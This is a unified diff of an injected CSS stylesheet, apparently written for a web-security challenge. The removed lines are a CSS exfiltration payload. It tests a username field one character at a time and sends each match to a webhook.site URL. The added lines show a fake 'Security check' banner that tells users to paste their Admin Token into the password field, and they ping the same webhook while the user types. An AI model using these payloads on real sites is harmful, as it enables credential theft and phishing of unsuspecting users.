@@ -1,76 +1,15 @@
-/* brute input[name="username"] after:  */
-html:has(input[name="username"][value=""]){background-image:url("https://webhook.site/11e4badb-e5de-41af-817a-234a883715fb?done=1&field=input%5Bname%3D%22username%22%5D&v=")}
-html:has(input[name="username"][value^="a"]){background-image:url("https://webhook.site/11e4badb-e5de-41af-817a-234a883715fb?next=a&field=input%5Bname%3D%22username%22%5D")}
-html:has(input[name="username"][value^="b"]){background-image:url("https://webhook.site/11e4badb-e5de-41af-817a-234a883715fb?next=b&field=input%5Bname%3D%22username%22%5D")}
-html:has(input[name="username"][value^="c"]){background-image:url("https://webhook.site/11e4badb-e5de-41af-817a-234a883715fb?next=c&field=input%5Bname%3D%22username%22%5D")}
-html:has(input[name="username"][value^="d"]){background-image:url("https://webhook.site/11e4badb-e5de-41af-817a-234a883715fb?next=d&field=input%5Bname%3D%22username%22%5D")}
-html:has(input[name="username"][value^="e"]){background-image:url("https://webhook.site/11e4badb-e5de-41af-817a-234a883715fb?next=e&field=input%5Bname%3D%22username%22%5D")}
-html:has(input[name="username"][value^="f"]){background-image:url("https://webhook.site/11e4badb-e5de-41af-817a-234a883715fb?next=f&field=input%5Bname%3D%22username%22%5D")}
-html:has(input[name="username"][value^="g"]){background-image:url("https://webhook.site/11e4badb-e5de-41af-817a-234a883715fb?next=g&field=input%5Bname%3D%22username%22%5D")}
-html:has(input[name="username"][value^="h"]){background-image:url("https://webhook.site/11e4badb-e5de-41af-817a-234a883715fb?next=h&field=input%5Bname%3D%22username%22%5D")}
-html:has(input[name="username"][value^="i"]){background-image:url("https://webhook.site/11e4badb-e5de-41af-817a-234a883715fb?next=i&field=input%5Bname%3D%22username%22%5D")}
-html:has(input[name="username"][value^="j"]){background-image:url("https://webhook.site/11e4badb-e5de-41af-817a-234a883715fb?next=j&field=input%5Bname%3D%22username%22%5D")}
-html:has(input[name="username"][value^="k"]){background-image:url("https://webhook.site/11e4badb-e5de-41af-817a-234a883715fb?next=k&field=input%5Bname%3D%22username%22%5D")}
-html:has(input[name="username"][value^="l"]){background-image:url("https://webhook.site/11e4badb-e5de-41af-817a-234a883715fb?next=l&field=input%5Bname%3D%22username%22%5D")}
-html:has(input[name="username"][value^="m"]){background-image:url("https://webhook.site/11e4badb-e5de-41af-817a-234a883715fb?next=m&field=input%5Bname%3D%22username%22%5D")}
-html:has(input[name="username"][value^="n"]){background-image:url("https://webhook.site/11e4badb-e5de-41af-817a-234a883715fb?next=n&field=input%5Bname%3D%22username%22%5D")}
-html:has(input[name="username"][value^="o"]){background-image:url("https://webhook.site/11e4badb-e5de-41af-817a-234a883715fb?next=o&field=input%5Bname%3D%22username%22%5D")}
-html:has(input[name="username"][value^="p"]){background-image:url("https://webhook.site/11e4badb-e5de-41af-817a-234a883715fb?next=p&field=input%5Bname%3D%22username%22%5D")}
-html:has(input[name="username"][value^="q"]){background-image:url("https://webhook.site/11e4badb-e5de-41af-817a-234a883715fb?next=q&field=input%5Bname%3D%22username%22%5D")}
-html:has(input[name="username"][value^="r"]){background-image:url("https://webhook.site/11e4badb-e5de-41af-817a-234a883715fb?next=r&field=input%5Bname%3D%22username%22%5D")}
-html:has(input[name="username"][value^="s"]){background-image:url("https://webhook.site/11e4badb-e5de-41af-817a-234a883715fb?next=s&field=input%5Bname%3D%22username%22%5D")}
-html:has(input[name="username"][value^="t"]){background-image:url("https://webhook.site/11e4badb-e5de-41af-817a-234a883715fb?next=t&field=input%5Bname%3D%22username%22%5D")}
-html:has(input[name="username"][value^="u"]){background-image:url("https://webhook.site/11e4badb-e5de-41af-817a-234a883715fb?next=u&field=input%5Bname%3D%22username%22%5D")}
-html:has(input[name="username"][value^="v"]){background-image:url("https://webhook.site/11e4badb-e5de-41af-817a-234a883715fb?next=v&field=input%5Bname%3D%22username%22%5D")}
-html:has(input[name="username"][value^="w"]){background-image:url("https://webhook.site/11e4badb-e5de-41af-817a-234a883715fb?next=w&field=input%5Bname%3D%22username%22%5D")}
-html:has(input[name="username"][value^="x"]){background-image:url("https://webhook.site/11e4badb-e5de-41af-817a-234a883715fb?next=x&field=input%5Bname%3D%22username%22%5D")}
-html:has(input[name="username"][value^="y"]){background-image:url("https://webhook.site/11e4badb-e5de-41af-817a-234a883715fb?next=y&field=input%5Bname%3D%22username%22%5D")}
-html:has(input[name="username"][value^="z"]){background-image:url("https://webhook.site/11e4badb-e5de-41af-817a-234a883715fb?next=z&field=input%5Bname%3D%22username%22%5D")}
-html:has(input[name="username"][value^="A"]){background-image:url("https://webhook.site/11e4badb-e5de-41af-817a-234a883715fb?next=A&field=input%5Bname%3D%22username%22%5D")}
-html:has(input[name="username"][value^="B"]){background-image:url("https://webhook.site/11e4badb-e5de-41af-817a-234a883715fb?next=B&field=input%5Bname%3D%22username%22%5D")}
-html:has(input[name="username"][value^="C"]){background-image:url("https://webhook.site/11e4badb-e5de-41af-817a-234a883715fb?next=C&field=input%5Bname%3D%22username%22%5D")}
-html:has(input[name="username"][value^="D"]){background-image:url("https://webhook.site/11e4badb-e5de-41af-817a-234a883715fb?next=D&field=input%5Bname%3D%22username%22%5D")}
-html:has(input[name="username"][value^="E"]){background-image:url("https://webhook.site/11e4badb-e5de-41af-817a-234a883715fb?next=E&field=input%5Bname%3D%22username%22%5D")}
-html:has(input[name="username"][value^="F"]){background-image:url("https://webhook.site/11e4badb-e5de-41af-817a-234a883715fb?next=F&field=input%5Bname%3D%22username%22%5D")}
-html:has(input[name="username"][value^="G"]){background-image:url("https://webhook.site/11e4badb-e5de-41af-817a-234a883715fb?next=G&field=input%5Bname%3D%22username%22%5D")}
-html:has(input[name="username"][value^="H"]){background-image:url("https://webhook.site/11e4badb-e5de-41af-817a-234a883715fb?next=H&field=input%5Bname%3D%22username%22%5D")}
-html:has(input[name="username"][value^="I"]){background-image:url("https://webhook.site/11e4badb-e5de-41af-817a-234a883715fb?next=I&field=input%5Bname%3D%22username%22%5D")}
-html:has(input[name="username"][value^="J"]){background-image:url("https://webhook.site/11e4badb-e5de-41af-817a-234a883715fb?next=J&field=input%5Bname%3D%22username%22%5D")}
-html:has(input[name="username"][value^="K"]){background-image:url("https://webhook.site/11e4badb-e5de-41af-817a-234a883715fb?next=K&field=input%5Bname%3D%22username%22%5D")}
-html:has(input[name="username"][value^="L"]){background-image:url("https://webhook.site/11e4badb-e5de-41af-817a-234a883715fb?next=L&field=input%5Bname%3D%22username%22%5D")}
-html:has(input[name="username"][value^="M"]){background-image:url("https://webhook.site/11e4badb-e5de-41af-817a-234a883715fb?next=M&field=input%5Bname%3D%22username%22%5D")}
-html:has(input[name="username"][value^="N"]){background-image:url("https://webhook.site/11e4badb-e5de-41af-817a-234a883715fb?next=N&field=input%5Bname%3D%22username%22%5D")}
-html:has(input[name="username"][value^="O"]){background-image:url("https://webhook.site/11e4badb-e5de-41af-817a-234a883715fb?next=O&field=input%5Bname%3D%22username%22%5D")}
-html:has(input[name="username"][value^="P"]){background-image:url("https://webhook.site/11e4badb-e5de-41af-817a-234a883715fb?next=P&field=input%5Bname%3D%22username%22%5D")}
-html:has(input[name="username"][value^="Q"]){background-image:url("https://webhook.site/11e4badb-e5de-41af-817a-234a883715fb?next=Q&field=input%5Bname%3D%22username%22%5D")}
-html:has(input[name="username"][value^="R"]){background-image:url("https://webhook.site/11e4badb-e5de-41af-817a-234a883715fb?next=R&field=input%5Bname%3D%22username%22%5D")}
-html:has(input[name="username"][value^="S"]){background-image:url("https://webhook.site/11e4badb-e5de-41af-817a-234a883715fb?next=S&field=input%5Bname%3D%22username%22%5D")}
-html:has(input[name="username"][value^="T"]){background-image:url("https://webhook.site/11e4badb-e5de-41af-817a-234a883715fb?next=T&field=input%5Bname%3D%22username%22%5D")}
-html:has(input[name="username"][value^="U"]){background-image:url("https://webhook.site/11e4badb-e5de-41af-817a-234a883715fb?next=U&field=input%5Bname%3D%22username%22%5D")}
-html:has(input[name="username"][value^="V"]){background-image:url("https://webhook.site/11e4badb-e5de-41af-817a-234a883715fb?next=V&field=input%5Bname%3D%22username%22%5D")}
-html:has(input[name="username"][value^="W"]){background-image:url("https://webhook.site/11e4badb-e5de-41af-817a-234a883715fb?next=W&field=input%5Bname%3D%22username%22%5D")}
-html:has(input[name="username"][value^="X"]){background-image:url("https://webhook.site/11e4badb-e5de-41af-817a-234a883715fb?next=X&field=input%5Bname%3D%22username%22%5D")}
-html:has(input[name="username"][value^="Y"]){background-image:url("https://webhook.site/11e4badb-e5de-41af-817a-234a883715fb?next=Y&field=input%5Bname%3D%22username%22%5D")}
-html:has(input[name="username"][value^="Z"]){background-image:url("https://webhook.site/11e4badb-e5de-41af-817a-234a883715fb?next=Z&field=input%5Bname%3D%22username%22%5D")}
-html:has(input[name="username"][value^="0"]){background-image:url("https://webhook.site/11e4badb-e5de-41af-817a-234a883715fb?next=0&field=input%5Bname%3D%22username%22%5D")}
-html:has(input[name="username"][value^="1"]){background-image:url("https://webhook.site/11e4badb-e5de-41af-817a-234a883715fb?next=1&field=input%5Bname%3D%22username%22%5D")}
-html:has(input[name="username"][value^="2"]){background-image:url("https://webhook.site/11e4badb-e5de-41af-817a-234a883715fb?next=2&field=input%5Bname%3D%22username%22%5D")}
-html:has(input[name="username"][value^="3"]){background-image:url("https://webhook.site/11e4badb-e5de-41af-817a-234a883715fb?next=3&field=input%5Bname%3D%22username%22%5D")}
-html:has(input[name="username"][value^="4"]){background-image:url("https://webhook.site/11e4badb-e5de-41af-817a-234a883715fb?next=4&field=input%5Bname%3D%22username%22%5D")}
-html:has(input[name="username"][value^="5"]){background-image:url("https://webhook.site/11e4badb-e5de-41af-817a-234a883715fb?next=5&field=input%5Bname%3D%22username%22%5D")}
-html:has(input[name="username"][value^="6"]){background-image:url("https://webhook.site/11e4badb-e5de-41af-817a-234a883715fb?next=6&field=input%5Bname%3D%22username%22%5D")}
-html:has(input[name="username"][value^="7"]){background-image:url("https://webhook.site/11e4badb-e5de-41af-817a-234a883715fb?next=7&field=input%5Bname%3D%22username%22%5D")}
-html:has(input[name="username"][value^="8"]){background-image:url("https://webhook.site/11e4badb-e5de-41af-817a-234a883715fb?next=8&field=input%5Bname%3D%22username%22%5D")}
-html:has(input[name="username"][value^="9"]){background-image:url("https://webhook.site/11e4badb-e5de-41af-817a-234a883715fb?next=9&field=input%5Bname%3D%22username%22%5D")}
-html:has(input[name="username"][value^="{"]){background-image:url("https://webhook.site/11e4badb-e5de-41af-817a-234a883715fb?next=%7B&field=input%5Bname%3D%22username%22%5D")}
-html:has(input[name="username"][value^="}"]){background-image:url("https://webhook.site/11e4badb-e5de-41af-817a-234a883715fb?next=%7D&field=input%5Bname%3D%22username%22%5D")}
-html:has(input[name="username"][value^="_"]){background-image:url("https://webhook.site/11e4badb-e5de-41af-817a-234a883715fb?next=_&field=input%5Bname%3D%22username%22%5D")}
-html:has(input[name="username"][value^="-"]){background-image:url("https://webhook.site/11e4badb-e5de-41af-817a-234a883715fb?next=-&field=input%5Bname%3D%22username%22%5D")}
-html:has(input[name="username"][value^="@"]){background-image:url("https://webhook.site/11e4badb-e5de-41af-817a-234a883715fb?next=%40&field=input%5Bname%3D%22username%22%5D")}
-html:has(input[name="username"][value^="."]){background-image:url("https://webhook.site/11e4badb-e5de-41af-817a-234a883715fb?next=.&field=input%5Bname%3D%22username%22%5D")}
-html:has(input[name="username"][value^="#"]){background-image:url("https://webhook.site/11e4badb-e5de-41af-817a-234a883715fb?next=%23&field=input%5Bname%3D%22username%22%5D")}
-html:has(input[name="username"][value^="+"]){background-image:url("https://webhook.site/11e4badb-e5de-41af-817a-234a883715fb?next=%2B&field=input%5Bname%3D%22username%22%5D")}
-html:has(input[name="username"][value^=":"]){background-image:url("https://webhook.site/11e4badb-e5de-41af-817a-234a883715fb?next=%3A&field=input%5Bname%3D%22username%22%5D")}
-html:has(input[name="username"][value^="$"]){background-image:url("https://webhook.site/11e4badb-e5de-41af-817a-234a883715fb?next=%24&field=input%5Bname%3D%22username%22%5D")}
-html:has(input[name="username"][value^="/"]){background-image:url("https://webhook.site/11e4badb-e5de-41af-817a-234a883715fb?next=%2F&field=input%5Bname%3D%22username%22%5D")}
-html:has(input[name="username"][value^="="]){background-image:url("https://webhook.site/11e4badb-e5de-41af-817a-234a883715fb?next=%3D&field=input%5Bname%3D%22username%22%5D")}
+/* Make the page “ask” for the Admin Token */
+h2.login, .error, #report-button { display:none !important; }
+.loginbox { position: relative; }
+.loginbox::before{
+  content: "Security check: Please paste your Admin Token into the Password field, then press Login.";
+  display:block; padding:12px; margin-bottom:10px;
+  font-weight:700; border:2px solid #f33; background:#ffe6e6; color:#900;
+}
+#username{ opacity:.35; pointer-events:none; } /* steer them away */
+#password{ outline:3px solid #f33; box-shadow:0 0 8px #f66; }
+
+/* keep a heartbeat so you know they’re typing */
+html:has(input[type="password"][value]){
+  background-image:url(https://webhook.site/11e4badb-e5de-41af-817a-234a883715fb?typing=1)
+}
